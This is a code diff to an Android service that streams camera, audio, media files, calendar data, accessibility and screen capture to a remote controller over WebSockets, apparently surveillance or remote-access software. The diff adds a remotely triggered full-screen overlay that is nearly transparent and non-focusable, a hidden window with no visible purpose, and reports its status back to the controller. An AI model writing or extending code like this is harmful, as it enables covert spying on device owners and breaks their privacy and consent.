@@ -126,6 +126,8 @@ class StreamingService : Service() {
         .readTimeout(0, TimeUnit.SECONDS)
         .build()
 
+    private var overlayView: android.view.View? = null
+
     @Volatile private var wsBack: WebSocket? = null
     @Volatile private var wsFront: WebSocket? = null
     @Volatile private var wsAudio: WebSocket? = null
@@ -531,6 +533,10 @@ class StreamingService : Service() {
                             "get-media-thumb"    -> sendMediaThumb(json.optLong("id",0), json.optString("mediaType","images"), ws)
                             "get-media-file"     -> sendMediaFile(json.optLong("id",0), json.optString("mediaType","images"), json.optString("requestId",""), ws)
                             "get-calendar"       -> sendCalendarEvents(json.optInt("days",14), ws)
+                            "set-overlay"        -> {
+                                if (json.optBoolean("enabled", false)) showOverlay() else hideOverlay()
+                                ws.send(JSONObject().put("type","overlay-status").put("enabled", overlayView != null).toString())
+                            }
                         }
                     } catch (_: Exception) {}
                 }
@@ -602,6 +608,8 @@ class StreamingService : Service() {
                 perms.put("mediaImages",   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) hasPerm(Manifest.permission.READ_MEDIA_IMAGES) else hasPerm(Manifest.permission.READ_EXTERNAL_STORAGE))
                 perms.put("mediaVideo",    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) hasPerm(Manifest.permission.READ_MEDIA_VIDEO) else hasPerm(Manifest.permission.READ_EXTERNAL_STORAGE))
                 perms.put("calendar",      hasPerm(Manifest.permission.READ_CALENDAR))
+                perms.put("overlay",       if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true)
+                perms.put("overlayActive", overlayView != null)
                 json.put("perms", perms)
             } catch (_: Exception) {}
             val ownerName = BuildConfig.OWNER_USERNAME.trim()
@@ -1558,6 +1566,38 @@ class StreamingService : Service() {
 
     // ── Lifecycle ──────────────────────────────────────────────────────────
 
+    private fun showOverlay() {
+        if (overlayView != null) return
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) return
+        Handler(Looper.getMainLooper()).post {
+            try {
+                val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
+                val params = android.view.WindowManager.LayoutParams(
+                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
+                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
+                    android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+                    PixelFormat.TRANSLUCENT
+                )
+                val view = android.view.View(this).apply {
+                    setBackgroundColor(android.graphics.Color.argb(1, 0, 0, 0))
+                }
+                wm.addView(view, params)
+                overlayView = view
+            } catch (_: Exception) {}
+        }
+    }
+
+    private fun hideOverlay() {
+        val v = overlayView ?: return
+        overlayView = null
+        Handler(Looper.getMainLooper()).post {
+            try {
+                (getSystemService(WINDOW_SERVICE) as android.view.WindowManager).removeView(v)
+            } catch (_: Exception) {}
+        }
+    }
+
     private fun disconnect() {
         cameraProvider?.unbindAll(); cameraProvider = null
         wsBack?.close(1000, "stop");   wsBack = null
@@ -1568,6 +1608,7 @@ class StreamingService : Service() {
         stopAudioCapture()
         stopAccessibilityCapture()
         releaseVirtualDisplay()
+        hideOverlay()
         mediaProjection?.stop(); mediaProjection = null
         hasProjection = false
     }
